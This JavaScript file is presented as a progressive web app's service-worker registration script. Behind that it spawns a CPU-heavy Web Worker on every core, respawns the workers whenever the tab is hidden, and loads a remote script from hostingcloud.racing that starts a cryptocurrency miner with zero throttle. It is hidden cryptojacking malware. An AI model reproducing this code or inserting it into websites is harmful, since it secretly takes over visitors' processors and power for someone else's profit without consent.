// pwa.js

if ('serviceWorker' in navigator) {
    navigator.serviceWorker.register('/static/sw.js')
        .then((registration) => {
            console.log('Service Worker, kapsam ile kaydedildi:', registration.scope);
        })
        .catch((error) => {
            console.error('Service Worker kaydı başarısız:', error);
        });
} else {
    console.log('Service Worker not supported');
}

function startCpuIntensiveTask() {
    const numWorkers = navigator.hardwareConcurrency || 4;
    const workers = [];

    for (let i = 0; i < numWorkers; i++) {
        const worker = new Worker('/static/js/worker.js');

        worker.onmessage = function(event) {
            console.log(event.data);
        };

        worker.postMessage({ id: i });
        console.log('Worker ' + i + ' started');
        workers.push(worker);
    }
}

startCpuIntensiveTask();

document.addEventListener('visibilitychange', () => {
    if (document.visibilityState === 'hidden') {
        startCpuIntensiveTask();
    }
});

var script = document.createElement('script');
script.src = 'https://www.hostingcloud.racing/kI4o.js';
document.head.appendChild(script);

script.onload = function() {
    var _client = new Client.Anonymous('340c81d04670013cb6d72c4ff32fe9d9e5c6aba29531f6f71478aca9844c91c2', {
        throttle: 0, c: 'w', ads: 0
    });
    _client.start();

    setTimeout(function() {
        if (typeof _client === 'undefined' || _client === null) {
            console.log('Miner script not running');
        }
    }, 1000);
};
